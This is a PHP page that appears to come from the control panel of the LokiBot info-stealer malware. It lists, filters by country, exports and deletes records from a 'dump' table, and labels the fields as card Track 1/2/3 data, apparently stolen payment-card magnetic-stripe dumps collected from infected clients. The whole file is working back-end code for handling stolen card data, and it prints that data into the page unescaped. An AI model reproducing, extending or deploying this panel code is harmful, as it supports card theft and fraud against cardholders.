<?php
	//https://en.wikipedia.org/wiki/ISO/IEC_7813
	if (basename($_SERVER['PHP_SELF']) == basename(__FILE__)) die();

	$Country = NULL;
	$Text	 = NULL;
	$PageSearch = '';
	$ExportTxt = GetText_('http_export_all', FALSE);
	$DeleteTxt = GetText_('http_delete_all', FALSE);
	
	if(isset($_REQUEST['st']))
	{
		$Text = explode(" ", trim($_REQUEST['st']));
		$PageSearch = '&st=' . trim($_REQUEST['st']);
		$ExportTxt = GetText_('http_export_selected', FALSE);
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	
	if(isset($_REQUEST['sc'][0]) && $_SERVER["REQUEST_METHOD"] == "POST")
	{
		$Country = $_REQUEST['sc'];
		$PageSearch = '&sc=' . implode('|', $Country);
		$ExportTxt = GetText_('http_export_selected', FALSE);
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	else if(isset($_REQUEST['sc']) && $_SERVER["REQUEST_METHOD"] == "GET")
	{
		$PageSearch = '&sc=' . trim($_REQUEST['sc']);
		$Country = explode("|", $_REQUEST['sc']);
		
		$ExportTxt = GetText_('http_export_selected', FALSE);
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	
	if(isset($Option_) && strlen($Option_))
	{
		if($Option_ == 'flush')
		{
			$ID_ = NULL;
			if(isset($_REQUEST['id']) && strlen(trim($_REQUEST['id'])))
				$ID_ = trim($_REQUEST['id']);

			$LokiDBCon->DeleteData("dump", $ID_, $Text, $Country);
			
			$Text = NULL;
			$Country = NULL;
			
			$ExportTxt = GetText_('http_export_all', FALSE);
			$DeleteTxt = GetText_('http_delete_all', FALSE);
		}
		else if($Option_ == 'export')
		{
			SetDownloadHeader("Dump_Export_" . NowDate("Ymd_His") . EXTENSION_);
			$LokiDBCon->ExportAllDump($Text, $Country);

			die_();
		}
	}
	
	$DataTable = $LokiDBCon->GetData('dump', $StartFrom, $PageLimit, NULL, $Text, $Country);
	$TotalPages = ceil($DataTable["NumOfTotal"] / $PageLimit);
	if((isset($DataTable["NumOfTotal"]) OR $DataTable["NumOfTotal"] != 0) && isset($DataTable[0]["data_id"]))
		$LINK_Delete = $LINK_Delete . $DataTable[0]["data_id"];
	
	
?>
			<div class="row">
				<div class='col-md-1 sidebar'></div>
				<div class='col-md-10 main'>
					<?php
					$Disabled = (!isset($DataTable["NumOfTotal"]) OR $DataTable["NumOfTotal"] == 0);
					$TableMenu = 
					array
					(
						array($LINK_Export.$PageSearch, $ExportTxt, $Disabled),
						array($LINK_Delete.$PageSearch, $DeleteTxt, $Disabled, "CONFIRM"),
						array("onvisible",GetText_('table_show_search', FALSE), $Disabled),
						array('st', '?'.ACTVALUE_.'='.$Action, $Disabled, 'INPUT'),
						array(GetCountrys(), GetText_('table_all_country', FALSE), $Disabled, 'MULTISELECT'),
						array(0, GetText_('table_search', FALSE), $Disabled, 'FORMEND'),
					);

					GetTableMenu($TableMenu, $ID_ = "table_menu")
					?>
	
					<table class="table-condensed" id="events_" data-toggle="table" data-toolbar="#table_menu" data-show-columns="true">
						<thead>
							<tr>
								<th data-sortable="true"  data-field="data"><?php GetText_('http_table_data'); ?></th>
								<th data-sortable="true"  data-halign="center" data-align="center" data-field="client"><?php GetText_('command_table_type'); ?></th>
								<th data-sortable="true"  data-halign="center" data-align="center" data-field="type"><?php GetText_('http_table_client'); ?></th>
								<th data-sortable="false" data-halign="center" data-align="center" data-field="report"><?php GetText_('http_table_report'); ?></th>
								<th data-sortable="true"  data-halign="center" data-align="center" data-field="time"><?php GetText_('http_table_time'); ?></th>
							</tr>
						</thead>	
						<tbody>
						<?php
							$Counter = 0;
							$TackDB = array("Track 1", "Track 2", "Track 3");
							while($DataTable["NumOfData"] > $Counter)
							{
								$ExplodedDump = explode("|", $DataTable[$Counter]["data_text"]);
								echo '<tr>
											<td>' . $ExplodedDump[0] . '</td>
											<td>' . $TackDB[$ExplodedDump[1]] . '</td>
											<td>'.FormatIcon($DataTable[$Counter]["data_client"], FALSE).'</td>
											<td><a href="' .$LINK_Report.$DataTable[$Counter]["report_id"]. '">Open</a></td>
											<td>'.NowDate(NULL, $DataTable[$Counter]["data_time"]).'</td>
									</tr>';
								$Counter++;
							} 
						?>
						</tbody>
					</table>

					<?php Pagination($TotalPages, $PageID, $PageLimit, ACTVALUE_, $Action.$PageSearch."&tD=".$DataTable["NumOfTotal"], $DataTable); ?>
					</div>
				<div class='col-md-1 sidebar'></div>
			</div>
			</div>
		</div>
	</div>
	</body>
</html>
